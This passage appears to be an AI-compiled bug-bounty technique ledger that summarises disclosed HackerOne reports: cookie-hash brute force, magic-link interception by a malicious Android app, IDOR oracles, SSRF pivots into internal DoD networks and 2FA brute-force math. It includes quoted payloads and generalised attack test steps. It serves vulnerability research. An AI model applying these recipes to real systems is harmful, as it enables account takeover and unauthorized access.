DETECTION SIGNAL: a "protection" feature (password/PIN gate) whose success state is a client-held static token = hash(secret) (cookie / localStorage; unsalted; no server session) — the tell is that the token is computable OFFLINE from a candidate; a rate limit present on the credential-SUBMIT endpoint but absent on the resource-ACCESS endpoint that validates the token; a protected object id that is public and STABLE across enabling the protection (page source, embed shortcode, share page).
CHAIN: attacker holds the survey id (primitive: id stable across enabling protection + leaked in the embed shortcode/source) -> brute-force `pd-pass_<id>` with MD5-hashed payloads against the unlimited content-access request (primitive: verifier = static unsalted MD5, checked with no rate limit) -> the password-protected survey/quizzes open for a non-authorized visitor (impact: unauthorized access to gated content — privacy content the creator explicitly locked; program rated Low 0.1-3.9; researcher, verbatim: "Probably, this issue works on quizzes too").
TRANSFERABLE TEST: on every password/PIN "protection" gate: (1) capture BOTH requests — the submit that sets the success token and the access request that presents it — and diff their rate-limit status (submit limited + access unlimited = the bypass lives on the access path); (2) decode the token: if it is `hash(secret)` (or base64/plain), compute candidates OFFLINE and brute-force the TOKEN on the ACCESS endpoint (Burp Intruder Payload Processing hashes each payload before sending — no live auth call needed); (3) collect the protected object's id BEFORE the gate is enabled (or from embeds/share pages/source) and confirm it does not change; (4) the opened content is the oracle; re-test at LOW concurrency after any claimed fix (the fix here still allowed ~5 threads). Rule: **the rate limit that matters is the one on the endpoint that ENFORCES the decision, and a verifier that is a client-computable hash of the password is not a session — it is an offline-brute-forceable static secret.**
DEDUPE/DELTA: DELTA over the recorded "brute-force an auth secret where the check is not rate-limited" family — NO §17 slot. Recorded neighbours REVIEWED: ledger 3899-3925 (#125505, Uber promo/invite codes — "business-logic / authorization-secret brute force with a DIFFERENTIAL RESPONSE-LENGTH ORACLE ... -> monetary impact", plus 5215 "the CORE oracle technique for referral/promo codes is ALREADY RECORDED"); ledger 11994-12007 (#970157, Twitter — the CURRENT-password field on the change-password API route is not rate-limited -> brute force -> ATO); ledger 4542 (Shopify `customerAccessTokenCreate` brute force "dodging the attempt limit by mutating the email's representation"); ledger 13646 (#1879549, Nextcloud basic-auth not bruteforce-protected). None records: (a) a VERIFIER THAT IS ITSELF THE HASHED SECRET in a client cookie (`pd-pass_SURVEYID=md5(password)` — the guess is hashed client-side and statically compared; an offline-computable bearer token, not a live auth call); (b) the SUBMIT-vs-ENFORCEMENT rate-limit asymmetry (the limit guards the wrong request; the bypass is at the content-ACCESS request — the vendor fix confirms it: "we added rate limiting to the cookie check"); (c) the object-id pre-collection trick (id stable across enabling the gate + leaked in the embed shortcode). NEW atoms kept: (a)+(b)+(c).
FRESHNESS: submitted 2020-06-23, disclosed 2020-11-18 — OUTSIDE the preferred 6-12 month window (~6.4 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no Crowdsignal account touched this pass); every quote above appears in the fetched report body (live `web_extract`, first route worked). The program rated this Low (0.1 ~ 3.9) and fixed it by rate-limiting the cookie check — recorded as the program states it, not inflated.

SOURCE: https://hackerone.com/reports/855618  2026-11-13 (submitted 2020-04-22, disclosed 2020-07-15; Shopify — Arrive app; reporter `nsl182`; weakness "Insufficiently Protected Credentials"; program severity Low (0.1 ~ 3.9) after "updated the severity from medium to low", $500 bounty, Resolved; duplicate #867105 later filed by `bigbug`; "Account takeover intercepting magic link for Arrive app")
ROUTE: live `web_extract` on the report page — FIRST route worked (researcher body incl. both GraphQL requests, mitigation and full timeline read).
STATUS: UNVERIFIED (not reproduced — no Android device/emulator or malicious APK was built this pass; every quote below is verbatim from the fetched report body)
CLASS: account takeover chain — a magic-link login whose token travels through a THIRD-PARTY deep-link domain (`*.app.link`, Branch.io) that is NOT App-Links-verified, so any app on the device can register an `intent-filter` and INTERCEPT the emailed link before the real app ever sees the token (CWE-939/CWE-940 -> ATO)
CORE METHOD:
  1. THE TOKEN CARRIER (verbatim): the login email's "Confirm the Email Address" button points at "an URL of this kind: `https://qvay.app.link/R3DvpIJKtR?%24uri_redirect_mode=2&token=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa&secret=FdPxCtPAaPUJ7hhLg75QeHFCRCk3ATxcvrim74QJiz87kzXBQecLYtjo2p4wgHRa`" — "This URL belong to branch.io and it will generate a chrome deeplink that will open Arrive app passing the token (visible in the URL) and continue the login flow."
  2. THE MISSING VERIFICATION (verbatim): "This domain (qvay.app.link) is not verified by the app via App Link, so it can be listened by any malicious app when a use tries to open a link to it. You can see that the `assetlinks.json` of that domain is empty: `https://qvay.app.link/.well-known/assetlinks.json` It can be configured to prevent these type of attacks."
  3. THE INTERCEPT (report's verbatim manifest snippet): `<intent-filter> <action android:name="android.intent.action.VIEW" /> <category android:name="android.intent.category.DEFAULT" /> <category android:name="android.intent.category.BROWSABLE" /> <data android:scheme="https" /> <data android:host="qvay.app.link" /> </intent-filter>` — "After the link is intercepted, we have a token we can Verify in order to get a `_arrive-server_session` cookie".
  4. THE REDEMPTION (report's verbatim request): `POST /graphql` · `Host: arrive-server.shopifycloud.com` · body `{"operationName":"VerifyToken","variables":{"token":"TOKENHERE"},"query":"mutation VerifyToken($token: String!) {\n verifyToken(token: $token) {\n user {\n id\n __typename\n }\n userErrors {\n field\n message\n __typename\n }\n __typename\n }\n}\n"}` — "The response will include a valid `_arrive-server_session` cookie we can use to access other parts of the app and pretty much taking over the account."
  5. THE BONUS (verbatim): "The malicious app doesn't even have to wait for the user to request a login email, it can trigger it by itself (considering it know the emails, but thats doable checking the email accounts of the phone via Android SDK)" — `POST /graphql` `{"operationName":"SendVerificationEmail","variables":{"email":"EMAILHERE"},"query":"mutation SendVerificationEmail($email: String!) ..."}` — "Not only it will create the email, but also will give us a `_arrive-server_session` cookie in the response that we can use for the previous step when we are validating the token."
  6. THE FIX (team, verbatim) names both missing controls: "1) Enabled App Links so another third party application can't intercept the link 2) Added server-side validation so that the code sent by the client when requesting the email is the same code sent by the client when opening the link from the email. This makes it so the link can only be used by the same client which made the initial request."
DETECTION SIGNAL: an emailed magic link / auth link that resolves through a deep-link or short-link DOMAIN THE APP DOES NOT OWN (Branch `*.app.link`, Firebase `*.page.link`, a custom shortener); fetch `/.well-known/assetlinks.json` (Android) and `/.well-known/apple-app-site-association` (iOS) on that domain — EMPTY/absent = no App Links/AASA verification = a competing `intent-filter` can win the link open; the auth token riding in the URL query (`token=`, `secret=`, `code=`).
CHAIN: attacker app installed on the victim's device (precondition — recorded honestly, it is the report's own threat model) -> registers `intent-filter` for `https://<sub>.app.link` (primitive: the link domain is unverified, `assetlinks.json` empty) -> the victim requests a login email and taps the link; the OS delivers the URL to the malicious app first (escalation: full URL incl. `token=`/`secret=` captured) -> `VerifyToken` GraphQL mutation redeems the stolen token (primitive: the token is the only authenticator) -> the response sets `_arrive-server_session` (impact: full account takeover — "The account is compromised and the malicious app can potentially access private data like location, etc..."; the bonus leg removes the wait entirely: `SendVerificationEmail` both triggers the email and mints a session cookie in its own response).
TRANSFERABLE TEST: for every mobile magic-link / email-login flow: (1) capture the emailed link and identify any THIRD-PARTY deep-link/short-link domain it passes through; (2) fetch `https://<that-domain>/.well-known/assetlinks.json` and `/.well-known/apple-app-site-association` — empty/absent means any installed app can register `<data android:scheme="https"/><data android:host="<that-domain>"/>` in an `intent-filter` and intercept the click (two-line malicious manifest; test on an emulator with a throwaway APK); (3) redeem the captured token against the app's API (find the verify mutation/endpoint — the response often mints the session cookie directly); (4) also check whether the SEND-EMAIL request itself returns a session, and whether the redeem is bound to the requesting client (the fix here binds the code at request time to the code at open time). Rule: **a magic link is only as safe as the domain that carries it — if the link's deep-link domain is not App-Links/AASA-verified, any app on the device can steal the link and the token in its URL IS the account; bind the link to the requesting client instance server-side.**
DEDUPE/DELTA: DELTA over the recorded mobile deep-link family — NO §17 slot. Recorded neighbours REVIEWED: ledger 3325-3341 (#1372667, Basecamp — "MOBILE DEEP-LINK → INTERNAL-URL ALLOWLIST BYPASS via a re-parsed redirect QUERY PARAM, chained into a JS↔NATIVE BRIDGE that sends the auth header to an attacker URL → bearer-token theft → ATO" — its test manipulates query params INSIDE the app's own deep link, never intercepts the email link); ledger 10182 (enumerate the custom URL schemes / `android:scheme` intent-filters an app registers); §17.709 (dotted custom-scheme allowlist bypass); ledger 2131-2132 (magic-link email type-confusion fan-out -> ATO) and 2930 (magic-link initiate RESPONSE leaks the token); Bugbountyskills 5339/18508/18545 (assetlinks.json / AASA as VERIFIER recon traffic only). None records: (a) the unverified THIRD-PARTY deep-link domain as the weak link of an emailed magic link, with EMPTY `assetlinks.json` as the interception oracle; (b) competing `intent-filter` INTERCEPTION of the emailed link itself (the legitimate app never receives the URL); (c) the redemption shape (GraphQL `VerifyToken` -> session cookie in the response); (d) the send-email mutation that also mints a session cookie (arms the intercept without waiting); (e) the client-binding fix as a design test ("the code sent by the client when requesting the email is the same code sent ... when opening the link"). NEW atoms kept: (a)-(e).
FRESHNESS: submitted 2020-04-22, disclosed 2020-07-15 — OUTSIDE the preferred 6-12 month window (~6.6 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no Android emulator or malicious APK this pass); every quote above appears in the fetched report body (live `web_extract`, first route worked). Preconditions recorded as the report states them: the malicious app must be INSTALLED on the victim's device and the victim must open the emailed link; the program rated the report Low (0.1 ~ 3.9) with a $500 bounty — recorded as the program states it (the title's "Account takeover" is the researcher's framing of the terminal).

SOURCE: https://hackerone.com/reports/663431  2026-11-13 (submitted 2019-07-29, resolved; HackerOne self-report by `jobert`; weakness "Insecure Direct Object Reference (IDOR)"; program severity Low; `visibility: full`, VI read IN FULL)
ROUTE: live `curl https://hackerone.com/reports/663431.json` — FIRST route worked (full `vulnerability_information`).
STATUS: UNVERIFIED (not reproduced — no private hackathon object exists to test against; every quote below is verbatim from the fetched report body)
CLASS: IDOR on an array-style FILTER parameter where the hidden object is never returned — the object's filter is silently APPLIED to the caller's own result set and the DISTRIBUTION of the returned rows is the oracle leaking the object's metadata (CWE-639 -> metadata inference)
CORE METHOD:
  1. THE SINK (verbatim): "One of the Bugs overview filters enables a program member to filter by Hackathon that their program was a part of. This filter is applied when hackathon IDs are provided in the `hackathons` parameter, like https://hackerone.com/bugs?subject=security&hackathons[]=28." — the parameter "takes an array of IDs and is vulnerable to an IDOR".
  2. THE HIDDEN APPLICATION (verbatim): "When a hackathon ID is given that belongs to a private hackathon, a date range will be applied." — the foreign object's scope (a submission-date window) is applied to YOUR OWN query with no authorization check on the ID.
  3. THE ORACLE (verbatim): "Based on the extremes of the returned reports submission date, a user could determine the date range of the hackathon." — read min/max of the returned rows' `submitted_at`; with and without `hackathons[]=<foreign id>` the extremes snap to the hidden object's boundaries.
  4. RESOLUTION CONDITION (verbatim): "This vulnerability is easier to exploit for a program that has a lot of reports submitted on different days."
  5. HONEST IMPACT LIMIT (verbatim): "The date range of a private hackathon could be determined. At the moment, there aren't any real hackathon objects that are marked as private, so no sensitive information is disclosed."
DETECTION SIGNAL: a search/overview endpoint whose filter parameters take OBJECT IDs (arrays of ids, slugs, enum handles) belonging to collections the caller cannot list; the tell is a 200 with YOUR rows whose COUNT, PAGINATION TOTAL or column EXTREMES (min/max date/price) change when a guessed foreign ID is supplied — the response never shows the object, it shows the object's FILTER acting.
CHAIN: program member supplies a foreign/private object id in `hackathons[]` (primitive: no authz check on the filter selector) -> the private object's date filter is applied to the caller's own result set (escalation: hidden-object scope leak) -> min/max of returned `submitted_at` reveals the private hackathon's active date range (impact: metadata inference on a private object — P5-grade alone, admitted as the ORACLE METHOD / first link of an enumeration chain per the counter-oracle precedent, NOT as a standalone disclosure finding; program rated Low and noted no real private hackathon objects existed).
TRANSFERABLE TEST: on every search/overview/list endpoint, collect every multi-select or single filter that takes an object identifier you do not own (`X[]=`, `X:`, `filter[x]`, enum handles). For each candidate/guessed id: snapshot the result set (count, total, min/max of any date/price/count column, first/last rows), add the id to the filter, and re-snap — a change in COUNT/EXTREMES/PAGINATION TOTAL without the object appearing is an authorization failure: the foreign object's filter ran on your query. Sweep ids to reconstruct hidden objects' metadata (active windows, sizes, price bands) from row-distribution deltas alone. Also try the reverse direction (ids that EXCLUDE rows). Rule: **when a filter selector is not authorization-checked, the response does not need to RETURN the hidden object — the object's own filter reshapes your rows, and the shape of your result set is the leak.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.723 in /root/Bugbountyskills.md. Recorded neighbours REVIEWED and NOT conflated: ledger 4770-4787 (the counter-oracle — a WRITE mutation against a foreign handle + a PUBLIC per-user COUNTER ticking = existence oracle; observable is a counter, input is a write mutation — here the observable is the READ-SIDE result-set distribution and the leak is an ATTRIBUTE, not existence); ledger 3899-3925 / 11994-12007 (response-length/behavioral differentials on brute-force oracles — different input class); `hackathon|663431|extremes|min/max` = 0 hits across the three write targets and the `result set` hits are SQLi/NoSQLi/anomaly-ranking contexts, none a hidden-object filter oracle. NEW axes: (a) an IDOR observed WITHOUT the object ever being returned (pure side-effect on the caller's own rows); (b) the oracle is row-DISTRIBUTION (min/max of a column), not count or length; (c) the leaked datum is the hidden object's own metadata (its active window).
FRESHNESS: submitted 2019-07-29 — OUTSIDE the preferred 6-12 month window (~7.3 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (the report itself says no real private hackathon objects existed at the time); every quote above appears in the fetched report body (live `.json`, `visibility: full`). Program severity Low, self-report by `jobert` on the HackerOne program — recorded as the program states it, not inflated.

SOURCE: https://hackerone.com/reports/326043  2026-11-13 (submitted 2018-03-15, disclosed 2018-04-17; U.S. Dept Of Defense VDP; reporter `alyssa_herrera`; title "SSRF+XSS"; team severity Critical (9 ~ 10) — triage raised medium -> critical on the escalation; `visibility: no-content`, VI 0 B — the public body is the program summary, which CREDITS the writeup)
ROUTE: live `curl https://hackerone.com/reports/326043.json` (HTTP 200; `summaries[0].content` read IN FULL) + live `web_extract` on the report page (FIRST route worked); the CREDITED public writeup "Piercing the Veil: Server Side Request Forgery to NIPRNet access" (https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a) read IN FULL via `web_extract` — the extractor resolved the medium.com URL to the infosecwriteups.com cross-post copy of the same article — THE ROUTE THAT WORKED for the technique.
STATUS: UNVERIFIED (not reproduced — no Jira instance or internal surface was touched this pass; every quote below is verbatim from the fetched writeup/report summary)
CLASS: SSRF escalation ladder — the ENTRY VECTOR is the RECORDED Jira OAuth `consumerUri` SSRF (sibling report #326040, CVE-2017-9506 — ledger 320/512); the method recorded here is the ESCALATION the writeup adds: error-based + time-based SSRF port oracles -> TRUSTED-EGRESS PIVOT to services that admit BY SOURCE IP (intranet / NIPRNet / IP-allowlisted internals) -> internal-network access (§1 SSRF-with-internal-reach + admin/internal-service access; team verdict Medium -> Critical on this terminal)
CORE METHOD:
  1. THE VECTOR (recorded sibling, quoted for the chain): "The full URL would look like this, `https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com`" — full-response SSRF in an outdated Jira.
  2. IMDS RUNG: `consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credential` failed, but `http://169.254.169.254/latest/dynamic/instance-identity/document` worked — "Which reveals the private IP, account ID, server information, etc".
  3. ERROR-BASED ORACLE (verbatim): "What made testing this end point quite easy was the fact I could see various errors occurring that can help me probe their server and network. This is considered error based SSRF." — localhost ports probed 21 (FTP), 22 (SSH), 80, 443, 8080, then protocols `gopher:// dict:// ftp:// file:// ldap://` ("none of this resulted in anything as they didn't support any of the protocols").
  4. THE TRUSTED-EGRESS PIVOT (the new axis; the author credits James Kettle's "Cracking the Lens"): find intranet services "only accessible by a DoD IP or coming from a DoD service", then fetch them THROUGH the SSRF — whose egress IS a trusted DoD IP: "The first website I queried and it displayed a USG warning while the other website simply timed out... Through this I was able to access NIPRNet ... and was confirmed to have accessed to it." — the SSRF's network IDENTITY, not its URL fetch, is the exploit.
  5. BLIND VARIANT (second Jira, no verbose errors): TIME-BASED port oracle, verbatim: "Querying Port 22 resulted in a 1,000ms response time. Where as querying Port 21 resulted in a 10,000 ms response time" + the SSRF's own Burp Collaborator callback inspected: "they were leaking sensitive information including an 'X-Forwarded-For' header that leaked an internal IP" — AWS metadata unreachable on this host but "I was able to query the intranet IP's and DoD servers just like I did with the first website".
  6. ERROR-TRAIL LEAK TRIGGERS (verbatim): "a stack error would occur and leak out various sensitive information ... You can typically trigger it by using an incomplete HTTP Protocol like http:// or ... `http://[::]`. Information that is leaked include the Database IP, version of the database, plugins being used, OS, architecture of the OS" — plus sibling-instance discovery from the target's own UI: "sometimes the website would have links to other Altassian instances ... a confluence instance on a different sub-domain ... was also vulnerable to the vulnerability."
  7. FILTER-BYPASS RESIDUE (two older SSRFs re-escalated with the same ladder): "abusing an HTTP connect request for querying a specific IP's ... we submitted *CONNECT IP* and we could then enumerate services" + host-header auth abuse "for example: *militarywebsite.mil@internal_IP*" + blind oracles "the page telling me the operation timed out, an SSL error, or some variation of it".
DETECTION SIGNAL: an SSRF (esp. on org-hosted infra: Jira/Confluence/CI/monitoring) whose response BODY/STATUS/LATENCY differs per internal target — the difference IS the port/service oracle; a callback (Collaborator/interactsh) whose request headers carry `X-Forwarded-For`/internal IPs = the egress identity to pivot with; a stack trace surfacing on `http://` or `http://[::]` naming DB IP/version/plugins/OS = the version map for the next rung; internal hostnames in error pages/menus = the trusted-egress target list.
CHAIN: outdated Jira `icon-uri?consumerUri` SSRF (recorded vector, sibling #326040) -> error-based port/protocol enumeration (rung 1) -> trusted-egress pivot: source-IP-restricted intranet services fetched through the SSRF because its egress is a trusted org IP -> confirmed internal-network access (USG warning page served; internal web services found; "confirmed to have accessed" NIPRNet) + IMDS `instance-identity/document` (account ID, private IP) on the first host -> team verdict CRITICAL (raised from Medium). Blind branch: time-based port oracle (22 -> 1,000 ms vs 21 -> 10,000 ms) + Collaborator header leak (internal IP) reaches the same intranet targets.
TRANSFERABLE TEST: on ANY SSRF on org-hosted infra: (1) enumerate the internal surface with the ORACLE — request `http://127.0.0.1:<port>/` / `http://<internal-ip>:<port>/` across 21/22/80/443/8080/8443... and diff response ERROR TEXT (error-based) and LATENCY (time-based: open -> fast, filtered/closed -> multi-second); one request per port, no scanner needed; (2) if responses are verbose, trigger the stack-trace path with an incomplete protocol (`http://`) or `http://[::]` and parse DB IP/version/plugins/OS/arch; (3) read your OWN callback's headers (`X-Forwarded-For`, `Via`) to learn the egress/internal IP; (4) THE PIVOT: assemble hostnames/IPs of services that GRANT ACCESS BY SOURCE IP (intranet sites, IP-allowlisted admin panels — from OSINT, "Cracking the Lens"-style public lists, error leaks, menus) and fetch them THROUGH the SSRF; confirm by content (warning banners, internal nav). Rule: **an SSRF's terminal is not only cloud metadata — the egress identity reaches every source-IP-authenticated internal service, and when the fetch is blind, latency and error-text deltas are the port oracle.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.724 in /root/Bugbountyskills.md. The VECTOR is already recorded (ledger 512 table row "326040 | U.S. DoD — Jira OAuth `consumerUri` | SSRF + XSPA | Critical, CVE-2017-9506" + the request shape at ledger 320) — this entry records only the ESCALATION LADDER. Recorded neighbours REVIEWED and NOT conflated: ledger 11680 (XXE escalated to a time-based internal port scan — same ORACLE class, different carrier; here SSRF + the trusted-egress terminal); the IMDS/metadata family (Bugbountyskills V-03; `169.254.169.254` recipes Bugbountyskills 12312-12348); the `@`-authority confusion family (ledger 19871) covering the `militarywebsite.mil@internal_IP` residue; Sentry blind SSRF (ledger 4527) whose chain names "the escalation is the INTERNAL REACH" but without the source-IP-trust framing, the oracle ladder, or the leak triggers; XSPA is named inside the doctrine §1 class list but no entry carries the pivot. NEW atoms kept: (a) the TRUSTED-EGRESS terminal; (b) `http://`/`http://[::]` as deliberate stack-trace leak triggers; (c) the SSRF callback's `X-Forwarded-For` as the internal-IP oracle; (d) the paired error-based + time-based port oracle as the blind enumeration rung.
FRESHNESS: submitted 2018-03-15, disclosed 2018-04-17 — OUTSIDE the preferred 6-12 month window (~8.6 years) — recorded as BACKFILL, flagged; read because assigned.

SOURCE: https://hackerone.com/reports/227522  2026-11-13 (submitted 2017-05-10, disclosed 2017-05-22; Radancy; reporter `kieran`; title "IDOR in editing courses"; weakness "Insecure Direct Object Reference (IDOR)"; `visibility: full` at dataset scrape — the body was read IN FULL from the LOCAL dataset mirror `/tmp/h1_train.parquet` (Hacker0x01/hackerone_disclosed_reports scrape; the Wayback page captures 20170920222213 / 20241004024821 carry the identical opening lines in `meta name="description"`, corroborating); the live `.json` now returns HTTP 404 and the live page is a Cloudflare 403 — the local mirror + Wayback meta are THE ROUTES THAT WORKED)
STATUS: UNVERIFIED (not reproduced — no instance of the target app was touched; every quote below is verbatim from the fetched body)
CLASS: IDOR on the `id` parameter of an object-EDIT POST whose edit silently RE-PARENTS the object — the foreign object is REMOVED from the owner's account and INSERTED into the attacker's (destructive cross-tenant transfer + deletion in ONE request; CWE-639)
CORE METHOD:
  1. THE SURFACE (verbatim): "This vulnerability consists in : https://mijn.werkenbijdefensie.nl/instellingen/gegevens/" — the user-settings page's "courses" feature.
  2. THE ID SOURCE (verbatim): "add a course in one account and look at the reponse of the POST request that is made to add this course. It is a number." — the create POST echoes a plain integer object id.
  3. THE RE-PARENT (verbatim PoC steps): "Create 2 accounts" / "Now go to the other account also make a course. Edit this course, and capture the POST of the request that is made to edit the course." / "Repeat the request but change the \"id\" parameter to the id the course that was made in the other account." / "reload the page".
  4. THE RESULT (verbatim): "The course got removed from the creator's account and was inserted into the account of the attacker."
  5. THE SCALE (verbatim): "Attacker can remove all courses of all users by iterating trough all the course id's."
DETECTION SIGNAL: an edit/update POST whose body carries an object `id` and whose effect MOVES the object into the caller's account (or deletes/creates rows as a side effect) — test with TWO accounts and diff BOTH accounts' lists, not just the HTTP response; the create response echoing a plain integer id is the enumeration source. Companion smell (batch 275's #1085743 OpenMage kernel): "a foreign id on a write path silently falls through to INSERT on the caller's own account" — where that fall-through lands ON the victim's row (remove + re-insert), it is this bug.
CHAIN: two accounts + one captured edit POST (primitive: the `id` parameter carries no ownership check) -> supply the victim's object id with the attacker's session (escalation: the object leaves the victim's account and is re-inserted under the attacker — a destructive cross-tenant write needing NO read primitive) -> iterate the integer id space (impact: mass theft + deletion of every user's objects — "remove all courses of all users"). Doctrine §8.4 preconditions/gain: two ordinary accounts + one intercepted request (no admin, no victim interaction) / deletion+theft of every tenant's objects at scale.
TRANSFERABLE TEST: on every edit/update endpoint: create one object per account; capture the edit POST from account B; swap its `id` (or nested object id) for account A's object and replay with B's session; reload BOTH accounts and diff. Object gone from A and present on B = destructive re-parent IDOR (reportable cross-tenant write at scale); present on both = double-ownership IDOR; silently ignored / INSERT-on-B = the #1085743 fall-through. Use the create response's numeric id echo to sweep the id space and measure mass impact. Rule: **on an edit path, watch WHERE THE OBJECT ENDS UP — a write IDOR that MOVES the row (deleted from the owner, re-inserted on the attacker) is a reportable mass-deletion primitive that needs no read at all.**
DEDUPE/DELTA: DELTA over the recorded plain IDOR family — no §17 slot. Recorded neighbours REVIEWED and NOT conflated: batch 275's #1085743 (OpenMage — a foreign id on a write path that FAILS CLOSED on the victim: the write lands on the attacker's OWN account and the only documented escalation is self-DoS, so it was declined; here the victim's row is REMOVED and re-parented — the real cross-tenant write that entry's residue anticipated); the generic "swap the id in a state-changing request" entries (Bugbountyskills 1694-1742/14169; ledger 2481-2484 `DeleteStorySnaps`; 23749-23751; §17.467 transition-race — none records a re-parent/steal side effect). Tokens `227522|werkenbijdefensie|radancy|gegevens|re-parent|removed from the creator|inserted into the account` = 0 hits across the three write targets immediately before append. NEW atoms kept: (a) the destructive RE-PARENT side effect (delete-from-owner + insert-on-attacker in one edit request); (b) the create-POST's plain-integer id echo as the enumeration source; (c) mass deletion of all tenants' objects by iterating ids against one edit request shape.
FRESHNESS: submitted 2017-05-10 — OUTSIDE the preferred 6-12 month window (~9.5 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (no instance of the target exists to test); every quote above appears verbatim in the fetched body (local dataset mirror `vulnerability_information`; the Wayback `meta description` carries the identical opening lines). Bounty: `has_bounty?` true in the dataset, no amount public — not invented. Program "Radancy NL" per the dataset's team profile.

SOURCE: https://hackerone.com/reports/149598  2026-11-13 (submitted 2016-07-06, disclosed 2016-10-28; GitLab; reporter `yaworsk` (Pete Yaworski); title "Insecure 2FA/authentication implementation creates a brute force vulnerability"; weakness "Violation of Secure Design Principles"; state Resolved; full body + FULL timeline read via live `web_extract` on the report page — FIRST route worked (incl. GitLab's fix/acknowledgement messages); the body is also in the local dataset mirror `/tmp/h1_train.parquet` `visibility: full` VI 3,875 B, identical)
STATUS: UNVERIFIED (not reproduced — no live 2FA endpoint was brute-forced this pass; every quote below is verbatim from the fetched body/timeline)
CLASS: authentication bypass / ATO chain — 2FA (TOTP) brute force viable under RATE-LIMIT-ONLY protection (quantified by binomial math against the code space) PLUS a LOCKED-ACCOUNT PASSWORD-CONFIRMATION ORACLE (lockout halts sessions but not password validation)
CORE METHOD:
  1. MEASURE THE PER-WINDOW BUDGET (verbatim): "an attacker can submit anywhere from 10 - 19 requests to validate a 2FA before rate limiting kicks in. This then stops the attacker for, what appears to be, 30 - 40 seconds (in some tests it was less). Then an attacker can submit the username and password and submit another 9 requests" — "let's say they can submit 20 request per valid token" (TOTP "valid for 60 seconds" with drift).
  2. COMPUTE VIABILITY — binomial, verbatim: "tokens are 6 digits long, we have a 20 in 1,000,000 chance of being right (or 0.00002). So ... if we made 5,000 attempts (of 20 guesses per minute) at the token, we'd have a 9.5% chance of finding the right one at least once in 3.5 days ... 10,000 attempts would take approximately 7 days and yield an 18% chance" (the report cites a binomial calculator).
  3. THE SILENCE (verbatim): "a victim and admin get no notification / impact on service. The victim can still log in and use their account while the attacker is guessing a valid token, no email is generated to indicate someone is attempting to compromise their account".
  4. THE LOCKOUT ORACLE (verbatim): "After X number of attempts at guessing a password incorrectly, an account does become locked, an email sent to the victim and the attacker is never notified. But, while the account is locked, if an attacker guesses a correct password, they are still redirected to the 2FA screen to confirm a token rather than being stopped. So, while the account is locked, an attacker still is able to confirm a victim's password."
  5. THE MISSING CONTROLS (reporter's mitigations, verbatim): "Only allow 3 attempts at a token" / "After 3 different attempts at 3 different tokens, lock the user account and email the victim" / "Once an account is locked, do not validate the password of a user".
  6. THE FIX (timeline, verbatim): "A fix for this was merged today and will be included in the next 8.12 patch release" — commit `9264816a34c45fb36c0117fe95bdf9e9af3287c8` cited in the timeline (the old gitlab-ce GitHub URL 404s today and gitlab-foss does not carry the commit — recorded as the timeline states it, NOT fetched); GitLab credited the reporter in the vulnerability acknowledgements ("Please let me know how you'd like to be mentioned on the blog post and vulnerability acknowledgements").
DETECTION SIGNAL: a 2FA verification endpoint whose only brake is a soft rate limit (N attempts per token window before a 30-40 s pause); a 6-digit TOTP with 60 s validity; no lockout on token guessing and no victim/admin notification on repeated failures; a locked account where a CORRECT password still advances to the 2FA step (redirect-vs-error differential) = the lockout is a password oracle.
CHAIN: attacker holds the victim's password (precondition — the report's own framing: "once an attacker knows a victim's password"; leaked/reused/stolen first factor) -> ~20 guesses per 60 s token window, silently (primitive: rate-limit-only 2FA) -> binomial success ~9.5% per 3.5 days / 18% per week per account (escalation: probabilistic 2FA bypass, near-certain across a portfolio of accounts) -> full login as the victim = ATO ("bypass GitLab's 2FA implementation within days"). Parallel leg: when the account locks, password VALIDATION continues (correct password -> 2FA screen) — the attacker confirms passwords at will during lockout.
TRANSFERABLE TEST: (1) burst the 2FA validate endpoint until the limiter fires; record k = attempts per token window and the pause; (2) compute 1-(1-k/10^d)^t for code length d over a realistic campaign — material probability + no lockout/notification = a reportable 2FA-bypass ATO chain, reported WITH the math (never as "missing rate limit" per doctrine §2(c)); (3) lock the account with X failed passwords and diff correct-vs-incorrect password responses WHILE LOCKED — a redirect to the 2FA screen on the correct one means the lockout is a password-confirmation oracle (the fix shape: "once an account is locked, do not validate the password"); (4) confirm whether any victim/admin notification fires during the run. Rule: **rate limiting is not a 2FA defense — measure the attempts-per-token-window budget and turn it into a binomial ATO timeline; and a lockout that still validates the password is an oracle, not a control.**
DEDUPE/DELTA: NEW GENERAL METHOD -> §17.725 in /root/Bugbountyskills.md. Recorded neighbours REVIEWED and NOT conflated: #125505/#125200/#125707 (ledger 3899-3925 + 5202-5215 — invite/promo-CODE brute force with response-length oracles + keyspace reduction; static redeemable secrets, not a rotating TOTP, and the oracle is response length, not a per-window trial budget); ledger 4542-4543 (Shopify — the lockout COUNTER dodged by identifier-representation mutation; there the counter is reset, here the counter fires correctly and password validation continues beneath it); V-07 (OTP/2FA verify fail-open on `code=null`); §17.620 / ledger 17795-17796 (account-merge 2FA bypass); batch 275's #905816 brute-force-auth-secret family. Tokens `149598|yaworsk|TOTP|binomial|per valid token|locked.{0,20}password|lockout` = 0 technique hits across the three write targets immediately before append. NEW atoms kept: (a) the binomial viability computation for rotating-code brute force (attempts-per-token-window x code space -> P(success) over a campaign) as the REPORTABILITY decision for "weak rate limiting on 2FA"; (b) the LOCKED-ACCOUNT PASSWORD-CONFIRMATION ORACLE; (c) silence (no victim/admin notification) as the chain enabler.
FRESHNESS: submitted 2016-07-06 — OUTSIDE the preferred 6-12 month window (~10.3 years) — recorded as BACKFILL, flagged; read because assigned.
HONESTY: not reproduced (self-hosted GitLab 8.x-era behaviour; no 2FA endpoint was hammered this pass); every quote above appears in the fetched body or timeline (live page render). No severity rating and no bounty are shown on the report page ("---") — not invented. The researcher's own numbers ("10 - 19 requests", "9.5%", "18%") are recorded as the report states them.

